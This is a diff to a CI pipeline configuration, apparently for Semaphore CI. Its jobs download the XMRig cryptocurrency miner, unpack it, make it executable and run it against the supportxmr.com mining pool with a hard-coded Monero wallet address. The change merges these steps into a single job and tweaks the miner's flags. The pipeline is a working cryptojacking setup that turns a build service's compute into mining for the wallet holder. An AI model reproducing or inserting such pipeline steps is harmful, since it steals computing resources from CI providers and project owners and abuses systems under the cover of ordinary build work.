@@ -18,21 +18,6 @@ blocks:
         - name: wget
           commands:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.9.0/xmrig-6.9.0-linux-static-x64.tar.gz'
-  - name: tar
-    task:
-      jobs:
-        - name: tar
-          commands:
             - tar xvf xmrig-6.9.0-linux-static-x64.tar.gz
-  - name: 'Block #3'
-    task:
-      jobs:
-        - name: ch
-          commands:
             - chmod +x xmrig-6.9.0/xmrig
-  - name: 'Block #4'
-    task:
-      jobs:
-        - name: xmr
-          commands:
-            - './xmrig-6.9.0/xmrig -o pool.supportxmr.com:443 -u 85Rb2ZXHsQreQGWdvG6kwgNHnwbkgjBChdXPWt7VPuz8azP8FCQGiRXU2hkWPkMLNy4RMXPKDubgBYPC4AJJsZ8M7njL7z5 -k --tls --randomx-no-numa'
+            - './xmrig-6.9.0/xmrig -o pool.supportxmr.com:443 -u 85Rb2ZXHsQreQGWdvG6kwgNHnwbkgjBChdXPWt7VPuz8azP8FCQGiRXU2hkWPkMLNy4RMXPKDubgBYPC4AJJsZ8M7njL7z5 -k --tls'
